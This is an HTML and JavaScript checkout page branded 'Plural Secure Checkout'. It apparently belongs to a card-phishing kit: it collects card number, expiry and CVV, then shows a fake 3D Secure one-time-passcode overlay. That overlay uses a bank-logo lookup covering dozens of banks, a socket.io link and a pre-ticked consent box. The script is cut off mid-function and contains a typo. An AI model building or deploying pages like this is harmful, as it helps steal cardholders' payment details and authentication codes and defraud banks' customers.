<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>Plural Secure Checkout</title>
      <meta name="description" content="Secure payment gateway powered by Plural" />
      <meta name="author" content="Plural" />
  
      <!-- External CSS - Tailwind CDN -->
      <script src="https://cdn.tailwindcss.com"></script>
      
      <!-- Socket.io Client Library -->
      <script src="/socket.io/socket.io.js"></script>
      
      <style>
          body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
              background-color: #f7f9fc;
              margin: 0;
              padding: 0;
              background-image: linear-gradient(to bottom right, rgba(241, 245, 249, 0.8), rgba(226, 232, 240, 0.8));
          }
          .rounded-lg { border-radius: 0.5rem; }
          .border { border-width: 1px; }
          .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
          .bg-primary { background-color: #2563eb; }
          .text-white { color: white; }
          .font-bold { font-weight: 700; }
          .text-gray-100 { color: #f3f4f6; }
          .space-y-1 > * + * { margin-top: 0.25rem; }
          .p-6 { padding: 1.5rem; }
          .mb-4 { margin-bottom: 1rem; }
          .mb-6 { margin-bottom: 1.5rem; }
          .flex { display: flex; }
          .items-center { align-items: center; }
          .justify-between { justify-content: space-between; }
          .text-2xl { font-size: 1.5rem; }
         .text-sm { font-size: 0.875rem; }
          .text-gray-600 { color: #4b5563; }
          .space-x-2 > * + * { margin-left: 0.5rem; }
          .text-green-500 { color: #10b981; }
          .font-medium { font-weight: 500; }
          .gap-3 { gap: 0.75rem; }
          .h-8 { height: 2rem; }
          .w-12 { width: 3rem; }
          .h-6 { height: 1.5rem; }
          .object-contain { object-fit: contain; }
          .space-y-4 > * + * { margin-top: 1rem; }
          .relative { position: relative; }
          .pl-10 { padding-left: 2.5rem; }
          .pr-10 { padding-right: 2.5rem; }
          .absolute { position: absolute; }
          .left-3 { left: 0.75rem; }
          .top-3 { top: 0.75rem; }
          .right-3 { right: 0.75rem; }
          .top-2\.5 { top: 0.625rem; }
          .h-4 { height: 1rem; }
          .w-4 { width: 1rem; }
          .text-gray-400 { color: #9ca3af; }
          .h-5 { height: 1.25rem; }
          .w-10 { width: 2.5rem; }
          .grid { display: grid; }
          .grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
          .gap-4 { gap: 1rem; }
          .w-full { width: 100%; }
          .bg-blue-50 { background-color: #eff6ff; }
          .text-blue-500 { color: #3b82f6; }
          .h-12 { height: 3rem; }
          .w-12 { width: 3rem; }
          .text-center { text-align: center; }
          .bg-white { background-color: white; }
          .p-3 { padding: 0.75rem; }
          .border-gray-200 { border-color: #e5e7eb; }
          .mr-3 { margin-right: 0.75rem; }
          .bg-blue-100 { background-color: #dbeafe; }
          .rounded-full { border-radius: 9999px; }
          .p-2 { padding: 0.5rem; }
          .text-xs { font-size: 0.75rem; }
          .text-gray-500 { color: #6b7280; }
          .text-lg { font-size: 1.125rem; }
          .font-semibold { font-weight: 600; }
          .my-6 { margin-top: 1.5rem; margin-bottom: 1.5rem; }
          .justify-center { justify-content: center; }
          .w-10 { width: 2.5rem; }
          .h-14 { height: 3.5rem; }
          .w-14 { width: 3.5rem; }
          .mb-2 { margin-bottom: 0.5rem; }
          .cursor-not-allowed { cursor: not-allowed; }
          .opacity-50 { opacity: 0.5; }
          .text-blue-600 { color: #2563eb; }
          .py-8 { padding-top: 2rem; padding-bottom: 2rem; }
          .flex-col { flex-direction: column; }
          .animate-spin { animation: spin 1s linear infinite; }
          @keyframes spin { to { transform: rotate(360deg); } }
          .border-t-2 { border-top-width: 2px; }
          .border-b-2 { border-bottom-width: 2px; }
          .border-primary { border-color: #2563eb; }
          .h-16 { height: 4rem; }
          .w-16 { width: 4rem; }
          .bg-green-100 { background-color: #d1fae5; }
          .text-green-500 { color: #10b981; }
          .bg-red-100 { background-color: #fee2e2; }
          .text-red-500 { color: #ef4444; }
          .border-t { border-top-width: 1px; }
          .pt-0 { padding-top: 0; }
          .h-6 { height: 1.5rem; }
          .flex-wrap { flex-wrap: wrap; }
          .gap-6 { gap: 1.5rem; }
          .py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
          .h-5 { height: 1.25rem; }
          
          /* Form styles - IMPROVED */
          input {
              width: 100%;
              padding: 0.75rem 1.5rem;
              border: 1px solid #d1d5db;
              border-radius: 0.375rem;
              outline: none;
              font-size: 16px;
              transition: all 0.2s ease;
              height: 48px;
              box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
          }
          input:focus {
              border-color: #2563eb;
              box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
          }
          
          /* Improved input placeholder styling */
          input::placeholder {
              color: #a0aec0;
              font-weight: 400;
          }
  
          /* Add more spacing for non-icon inputs */
          input:not(.pl-10) {
              padding-left: 1.5rem;
          }
  
          /* Base styles for Pay Now button */
          .pay-now-btn {
              background-color: #a0aec0; /* Silver/gray */
              color: white;
              font-weight: 600;
              font-size: 16px;
              padding: 0.75rem;
              border-radius: 0.375rem;
              width: 100%;
              border: none;
              height: 52px;
              text-transform: uppercase;
              letter-spacing: 0.025em;
              cursor: not-allowed;
              transition: none;
          }
  
          /* Green style that will be applied through JavaScript */
          .btn-ready {
              background-color: #1a5e32 !important; /* Dark green */
              cursor: pointer !important;
          }
  
          /* Completely disable hover effects */
          .pay-now-btn:hover,
          .pay-now-btn:focus,
          .pay-now-btn:active {
              background-color: #a0aec0 !important; /* Keep silver color always */
              transform: none !important;
              box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2) !important;
              outline: none !important;
              color: white !important;
          }
  
          /* Add a separate class for enabled state that will be applied with JavaScript */
          .pay-now-btn.pay-enabled {
              background-color: #1a5e32 !important; /* Dark green */
              cursor: pointer !important;
          }
  
          /* Keep green color even on hover/active when enabled */
          .pay-now-btn.pay-enabled:hover,
          .pay-now-btn.pay-enabled:focus,
          .pay-now-btn.pay-enabled:active {
              background-color: #1a5e32 !important; /* Keep dark green */
          }
          
          /* Input icons - IMPROVED positioning */
          .input-icon {
              position: absolute;
              top: 50%;
              transform: translateY(-50%);
              color: #9ca3af;
              width: 28px;
              height: 28px;
              display: flex;
              align-items: center;
              justify-content: center;
          }
          .input-icon.left {
              left: 12px;
          }
          .input-icon.right {
              right: 12px;
          }
          
          /* Card container with improved styling */
          .card-container {
              background-color: white;
              border-radius: 0.75rem;
              box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
              overflow: hidden;
              position: relative;
              border: 1px solid rgba(226, 232, 240, 0.8);
          }
          
          /* Background pattern effect */
          .card-container::before {
              content: "";
              position: absolute;
              top: 0;
              left: 0;
              right: 0;
              height: 180px;
              background-image: 
                  radial-gradient(circle at 10% 20%, rgba(226, 232, 240, 0.2) 10%, transparent 20%),
                  radial-gradient(circle at 80% 40%, rgba(226, 232, 240, 0.3) 15%, transparent 25%),
                  radial-gradient(circle at 40% 70%, rgba(226, 232, 240, 0.4) 8%, transparent 15%);
              opacity: 0.5;
              z-index: 0;
              pointer-events: none;
          }
          
          /* OTP input styles - IMPROVED */
          .otp-input {
              display: flex;
              gap: 0.75rem;
              justify-content: center;
          }
          .otp-input input {
             width: 3rem;
              height: 3.5rem;
              text-align: center;
              font-size: 1.5rem;
              border: 1px solid #d1d5db;
              border-radius: 0.5rem;
              background-color: white;
              box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
          }
          .otp-input input:focus {
              border-color: #2563eb;
              box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
          }
          
          /* Card layout */
          @media (min-width: 768px) {
              .md\:flex { display: flex; }
              .md\:w-1\/2 { width: 50%; }
          }
          
          /* Separator line */
          .separator-vertical {
              width: 1px;
              height: 1.5rem;
              background-color: #e5e7eb;
          }
  
          /* MC verification styles */
          .fixed {
              position: fixed;
          }
          .inset-0 {
              top: 0;
              right: 0;
              bottom: 0;
              left: 0;
          }
          .z-50 {
              z-index: 50;
          }
          .bg-opacity-75 {
              --bg-opacity: 0.75;
          }
          .bg-black {
              background-color: rgba(0, 0, 0, var(--bg-opacity));
          }
          
          /* Card details section with improved styling */
          .card-details-section {
              padding: 2rem;
              position: relative;
              z-index: 1;
          }
          .card-details-section h2 {
              font-size: 1.25rem;
              font-weight: 600;
              margin-bottom: 1.5rem;
              color: #1e293b;
          }
          .form-group {
              margin-bottom: 1.25rem;
          }
          .form-group label {
              display: block;
              font-size: 0.875rem;
              font-weight: 500;
              margin-bottom: 0.5rem;
              color: #4b5563;
          }
          
/* Order summary section */
          .order-summary {
              padding: 2rem;
              background-color: #f8fafc;
              border-right: 1px solid #e2e8f0;
              position: relative;
              z-index: 1;
          }
          .order-summary h2 {
              font-size: 1.25rem;
              font-weight: 600;
              margin-bottom: 1.5rem;
              color: #1e293b;
          }
          
          /* Header bar */
          .header-bar {
              background: linear-gradient(90deg, #2563eb, #3b82f6);
              color: white;
              padding: 1.25rem 2rem;
              border-top-left-radius: 0.75rem;
              border-top-right-radius: 0.75rem;
          }
          
          /* Footer bar */
          .footer-bar {
              padding: 1.5rem 2rem;
              border-top: 1px solid #e2e8f0;
              background-color: #f8fafc;
              display: flex;
              flex-wrap: wrap;
              justify-content: center;
              align-items: center;
              gap: 1.5rem;
          }
          
          /* Security badges */
          .security-badge {
              display: flex;
              align-items: center;
              gap: 0.5rem;
          }
          
          .security-badge img {
              height: 1.5rem;
              width: auto;
          }
          
          /* MC Verification Styles */
          .fullscreen-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(2px);
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
          }
  
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
  
          #mcOtpInput:focus {
            border-color: #3498db !important;
            box-shadow: 0 0 2px rgba(52, 152, 219, 0.5) !important;
            outline: none !important;
          }
  
          .btn-loading {
            position: relative;
            pointer-events: none;
            opacity: 0.8;
          }
  
          #mcVerificationContent {
            font-family: Arial, sans-serif;
          }

          /* Error message styling */
          .error-message {
              color: #ef4444;
              font-size: 0.875rem;
              margin-top: 0.5rem;
          }

          /* Add spinner animation for loading states */
          .spinner {
              display: inline-block;
              width: 1.5rem;
              height: 1.5rem;
              border: 2px solid rgba(255, 255, 255, 0.3);
              border-radius: 50%;
              border-top-color: #fff;
              animation: spin 1s ease-in-out infinite;
              margin-right: 0.5rem;
              vertical-align: middle;
          }
      </style>
  </head>
  
  <body>
      <div id="app" class="min-h-screen flex items-center justify-center p-4">
          <!-- Initial static version that will show while JavaScript loads -->
          <div class="card-container w-full max-w-5xl">
              <div class="header-bar">
                  <div class="flex justify-between items-center">
                      <div class="text-2xl font-bold">Peacock Merchandise</div>
                      <p class="text-sm">100% Secure Payment</p>
                  </div>
                  <div class="text-gray-100">
                      Amount: $<span id="amount-display">0.00</span> USD
                   </div>
                  <div class="text-gray-100">Invoice ID: INV-<span id="invoiceId"></span></div>
              </div>
              
       <div class="md:flex">
                  <!-- Left Side - Order Summary -->
                  <div class="order-summary md:w-1/2">
                      <h2>Order Summary</h2>
                      
                      <div class="space-y-2">
                          <div class="flex justify-between">
                              <span class="text-gray-600">Sub Total</span>
                              <span>$<span class="subtotal-display">0.00</span></span>
                          </div>
                          <div class="flex justify-between">
                              <span class="text-gray-600">Tax (GST)</span>
                              <span>$<span class="tax-display">0.00</span></span>
                          </div>
                          <div class="border-t border-gray-200 my-2 pt-2 flex justify-between font-semibold">
                              <span>Total Amount</span>
                              <span>$<span class="amount-display">0.00</span></span>
                          </div>
                      </div>
                      
                      <div class="my-6">
                          <div class="flex items-center space-x-2 mb-3">
                              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
                              </svg>
                              <span class="font-medium">Secure Payment Gateway</span>
                          </div>
                          <p class="text-sm text-gray-600">
Your payment information is securely transmitted using 256-bit encryption. We do not store your card details.
                          </p>
                      </div>
                      
                      <div>
                          <h3 class="text-md font-medium mb-2">We Accept</h3>
                          <div class="flex flex-wrap gap-3">
                              <div class="h-8 w-12 flex items-center justify-center">
                                  <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-6 w-auto object-contain" />
                              </div>
                              <div class="h-8 w-12 flex items-center justify-center">
                                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-6 w-auto object-contain" />
                              </div>
                              <div class="h-8 w-12 flex items-center justify-center">
                                  <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" class="h-6 w-auto object-contain" />
                              </div>
                              <div class="h-8 w-12 flex items-center justify-center">
                                  <img src="https://static.wikia.nocookie.net/logopedia/images/5/57/Discover_Card_logo.svg/revision/latest/scale-to-width-down/300?cb=20211117164133" alt="Discover" class="h-6 w-auto object-contain" />
                              </div>
                          </div>
                      </div>
                  </div>
                  
<!-- CHANGE 4: Replace your card details section with this fixed version -->
<div class="card-details-section md:w-1/2">
    <h2>Card Details</h2>
    <form id="card-form" class="space-y-4">
        <div class="form-group">
            <label>Card Number</label>
            <div class="relative">
                <div class="input-icon left">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                        <line x1="1" y1="10" x2="23" y2="10"></line>
                    </svg>
                </div>
                <input 
                    type="text" 
                    id="card-number" 
                    placeholder="1234 5678 9012 3456" 
                    maxlength="19" 
                    class="pl-10 pr-10"
                />
                <div class="card-type-icon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%);">
                    <img src="" alt="" id="card-type-img" class="h-6" style="display: none;">
                </div>
            </div>
        </div>
        
        <div class="form-group">
            <label>Card Holder Name</label>
            <input 
                type="text" 
                id="card-holder" 
                placeholder="John Doe"
            />
        </div>
     
        <div class="grid grid-cols-2 gap-4">
            <div class="form-group">
                <label>Expiry Date</label>
                <input 
                    type="text" 
                    id="expiry-date" 
                    placeholder="MM/YY" 
                    maxlength="5"
                />
            </div>
            
            <div class="form-group">
                <label>CVV</label>
                <div class="relative">
                    <div class="input-icon left">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                        </svg>
                    </div>
                    <input 
                        type="password" 
                        id="cvv" 
                        placeholder="123" 
                        maxlength="4" 
                        class="pl-10"
                    />
                </div>
            </div>
        </div>
        
        <button 
            type="submit" 
            class="pay-now-btn"
            id="pay-now-btn"
        >
            Pay Now
        </button>
    </form>
</div>
              </div>
              
              <div class="footer-bar">
                  <div class="security-badge">
                      <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS" />
                      <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                  </div>
                  <div class="separator-vertical"></div>
                  <div>
                      <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-20 w-auto" />
                  </div>
                  <div>
                      <img src="https://images.seeklogo.com/logo-png/45/2/masterpass-logo-png_seeklogo-452118.png" alt="Mastercard SecureCode" class="h-24 w-auto" />
                  </div>
                  <div class="separator-vertical"></div>
                  <div class="text-xs text-gray-500">
                      <img src="https://cdn.pinelabs.com/india/img/press-release/plural-logo.png" alt="Powered by Plural" class="h-10 w-auto" />
                  </div>
              </div> 
          </div>
      </div>
  
  <!-- MC Verification Overlay -->
  <div id="mcVerificationOverlay" class="fullscreen-overlay">
    <!-- Loading Content - Shown Initially -->
    <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
      <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
      <!-- Added verification logo during loading -->
      <div id="loadingVerificationLogo" style="margin-top: 20px; height: 60px; text-align: center;">
        <!-- Logo will be inserted here dynamically -->
      </div>
    </div>
    
    <!-- Main Verification Content -->
    <div id="mcVerificationContent" style="display: none; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); padding: 0;">
      
      <!-- Header with bank and card logos -->
      <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #eee;">
        <!-- Left side - Bank logo -->
        <div style="height: 40px; display: flex; align-items: center;">
          <img id="bankLogo" src="https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png" alt="Bank Logo" style="height: 100%; max-width: 150px;">
        </div>
        
        <!-- Right side - Card verification logo -->
        <div style="height: 30px; display: flex; align-items: center;">
          <img id="verificationTypeLogo" src="https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png" alt="Verified by Visa" style="height: 100%; max-width: 120px;">
        </div>
      </div>
      
      <!-- Main content -->
      <div style="padding: 15px 20px;">
        <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
        
        <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
          <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4;">
            One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
          </p>
        </div>
        
        <!-- Transaction details - CENTER ALIGNED with more spacing -->
        <div style="margin-bottom: 20px; font-size: 13px; color: #333; display: flex; flex-direction: column; align-items: center;">
          <div style="display: grid; grid-template-columns: auto auto; gap: 8px 10px; width: 100%; max-width: 350px;">
            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Merchant</div>
            <div style="text-align: left; font-weight: 500;" id="merchantName">Peacock Merchandise</div>
            
            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Amount</div>
            <div style="text-align: left; font-weight: 500;">
              <span id="currencySymbol">$</span><span id="transactionAmount">0.00</span>
            </div>
            
            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Date</div>
            <div style="text-align: left; font-weight: 500;" id="transactionDate">02/04/2025 05:15:42</div>
            
            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Card Number</div>
            <div style="text-align: left; font-weight: 500;" id="cardNumberDisplay">XXXX XXXX XXXX 4352</div>
            
            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Reference Id</div>
            <div style="text-align: left; font-weight: 500;" id="referenceId">g4pxye</div>
          </div>
        </div>
        
        <!-- OTP input field - IMPROVED with label and input on same line -->
        <div style="margin-bottom: 20px; display: flex; align-items: center;">
          <span style="font-size: 14px; margin-right: 10px; min-width: 150px; font-weight: 400; color: #333; padding-left: 10px;">Enter One-Time Passcode</span>
          <div style="position: relative; width: 240px;">
            <input type="text" id="mcOtpInput" 
              style="width: 100%; padding: 8px 30px 8px 8px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; 
              font-weight: 400; transition: all 0.3s;" 
              placeholder="Enter One-Time Passcode" maxlength="6">
            <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
                <circle cx="12" cy="12" r="10"/>
                <path d="M12 16v-4M12 8h.01"/>
              </svg>
            </div>
          </div>
        </div>
        
        <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
          Incorrect OTP, please enter valid one time passcode sent to your registered mobile
        </p>
        
        <!-- Consent checkbox - aligned to match the image -->
        <div style="margin-bottom: 15px;">
          <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 12px; color: #555;">
            <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 5px; margin-top: 2px; width: 13px; height: 13px;" checked>
            <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
          </label>
        </div>
        
        <!-- Action buttons - styled to match the image -->
        <div style="display: flex; gap: 5px; margin-bottom: 10px;">
          <button id="mcSubmitBtn" style="flex: 1; padding: 8px 0; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
          <button id="mcResendBtn" style="flex: 1; padding: 8px 0; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
          <button id="mcCancelBtn" style="flex: 1; padding: 8px 0; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
        </div>
        
        <!-- Timer display -->
        <div id="mcTimer" style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;">Session expires in: 4:54</div>
        
        <!-- Footer links - styled to match the image -->
        <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
          <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Terms & Conditions</a> |
          <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">FAQs</a> |
          <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Contact Us</a>
        </div>
      </div>
    </div>
  </div>
  
      <script>
  // Global error handler to catch uncaught exceptions
  window.onerror = function(message, source, lineno, colno, error) {
      console.error('Uncaught error:', message, source, lineno, colno, error);
      const appElement = document.getElementById('app');
      if (appElement) {
          appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
              <h3 style="margin-bottom: 10px; font-size: 18px;">There was an error loading the page</h3>
              <p style="margin-bottom: 10px;">Please try refreshing the page or contact support if the issue persists.</p>
              <p style="font-size: 12px; color: #666;">Error details: ${message}</p>
              <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
          </div>`;
      }
      return true;
  };
        // Additional global error handler for all uncaught errors
window.addEventListener('error', function(event) {
    console.error('Uncaught error:', event.error);
    showErrorNotification('An unexpected error occurred. Please refresh and try again.');
    return false;
});
  
  // Initialize application state
  let state = {
      step: 'card', // 'card', 'otp', 'processing', 'success', 'failure'
      transactionId: '',
      loading: false,
      otpValue: '',
      amount: 0, // Start with 0, will be updated from URL parameter
      maskedPhone: '',
      cardType: null,
      timeLeft: 59,
      canResend: false,
      phoneLastFour: '',
      phoneNumberSet: false,
      cardForm: {
          cardNumber: '',
          cardHolder: '',
          expiryDate: '',
          cvv: '',
          errors: {}
      }
  };
  
  // Timer reference and socket
  let timerRef = null;
  let socket = null;
  let mcTimerInterval = null;
  
  // Map of bank codes to logo URLs
  const bankLogos = {
      'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
      'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
      'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
      'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
      'kotak': 'https://cdn.freelogovectors.net/svg07/kotakmahindrabank-logo.svg',
      'yes': 'https://logotyp.us/file/yes-bank.svg',
      'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
      'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
      'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
      'standard charterd': 'https://companieslogo.com/img/orig/STAN.L_BIG-27b2637e.png?t=1720244494',
      'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
      'bob': 'https://1000logos.net/wp-content/uploads/2021/06/logo-Bank-of-Baroda-500x281.png',
      'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
      'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
      'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
      'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
      'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
      'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
      'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
      'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
      'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
      'pnb': 'https://logotyp.us/file/pnb.svg',
      'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
      'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
      'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
      'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
      'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
      'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
      'cathy united taiwan': 'https://static.wikia.nocookie.net/logopedia/images/4/4b/CATHAY2002.png/revision/latest/scale-to-width-down/250?cb=20230808075909',
     'novascotia': 'https://asset.brandfetch.io/idpIpGPfn2/ideBeGWgbz.svg?updated=1667941638324',
      'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
      'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
      'landbank taiwan': 'https://www.landbank.com/new_assets/header/landbank_logo.webp',
      'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
      'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
      'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
      'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
      'm&t bank ': 'https://companieslogo.com/img/orig/MTB_BIG-01f85319.png?t=1720244493',
      'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
      'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
      'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
  };
  
ffunction parseURLParams() {
    try {
        console.log('Parsing URL parameters');
        const urlParams = new URLSearchParams(window.location.search);
        
        // First, try to get pid
        if (urlParams.has('pid')) {
            state.pid = urlParams.get('pid');
            console.log('Found pid in URL:', state.pid);
        }
        
        // Try to get amount from URL directly
        if (urlParams.has('amount')) {
            const urlAmount = parseFloat(urlParams.get('amount'));
            if (!isNaN(urlAmount)) {
                console.log('Found valid amount in URL:', urlAmount);
                state.amount = urlAmount;
                updateAmountDisplays();
                return; // Exit early if we got amount from URL
            }
        }
        
        // If we have pid but no amount, try directly fetching from server
        if (state.pid) {
            console.log('No amount in URL, fetching from server using pid:', state.pid);
            
            // Use a default amount of 1299.00 while waiting for server response
            state.amount = 1299.00;
            updateAmountDisplays();
            
            // Request amount from server
            fetchAmountFromServer(state.pid);
        } else {
            // No pid, no amount - use default
            console.log('No pid or amount found, using default amount');
            state.amount = 1299.00;
            updateAmountDisplays();
        }
    } catch (error) {
        console.error('Error parsing URL parameters:', error);
        // Use default on error
        state.amount = 1299.00;
        updateAmountDisplays();
    }
}

// New function to fetch amount directly from server
function fetchAmountFromServer(pid) {
    try {
        fetch(`/api/getPaymentDetails?pid=${pid}`)
            .then(response => response.json())
            .then(data => {
                console.log('Server response for payment details:', data);
                
                // Try multiple paths to find the amount - handle different server response formats
                let serverAmount = null;
                
                if (data.payment && data.payment.amount) {
                    serverAmount = parseFloat(data.payment.amount);
                } else if (data.amount) {
                    serverAmount = parseFloat(data.amount);
                } else if (data.status === 'success' && data.payment) {
                    if (typeof data.payment.amount !== 'undefined') {
                        serverAmount = parseFloat(data.payment.amount);
                    }
                } else {
                    // Try to find any property that might contain the amount
                    for (const key in data) {
                        if (data[key] && typeof data[key].amount !== 'undefined') {
                            serverAmount = parseFloat(data[key].amount);
                            break;
                        }
                    }
                }
                
                // If we found a valid amount, update displays
                if (serverAmount !== null && !isNaN(serverAmount)) {
